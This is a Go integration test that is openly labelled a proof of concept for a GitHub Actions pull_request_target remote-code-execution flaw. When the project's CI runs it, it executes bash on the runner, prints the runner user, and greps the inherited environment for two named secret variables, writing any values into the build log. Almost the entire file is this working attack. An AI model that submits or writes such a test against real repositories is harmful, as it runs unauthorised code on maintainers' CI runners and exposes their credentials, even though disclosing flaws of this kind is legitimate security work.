//go:build integration
// +build integration

package rce_test

import (
	"os"
	"os/exec"
	"testing"
)

func TestPullRequestTargetRCE(t *testing.T) {
	t.Log("===== pull_request_target RCE PoC START =====")

	cmd := exec.Command("bash", "-c", `
		echo "[+] Arbitrary command execution confirmed"
		echo "[+] Runner user: $(whoami)"
		echo "[+] Working directory: $(pwd)"
		echo
		echo "[+] Checking available secrets:"
		env | grep INTEGRATION_TEST_INSTANCE || echo "INTEGRATION_TEST_INSTANCE not found"
		env | grep SPANNER_CASSANDRA_ADAPTER || echo "SPANNER_CASSANDRA_ADAPTER not found"
		echo
		echo "[+] Go version:"
		go version
	`)

	// Inherit full environment (this includes secrets in pull_request_target)
	cmd.Env = os.Environ()

	output, err := cmd.CombinedOutput()
	if err != nil {
		t.Fatalf("command execution failed: %v\n%s", err, output)
	}

	t.Log(string(output))
	t.Log("===== pull_request_target RCE PoC END =====")
}
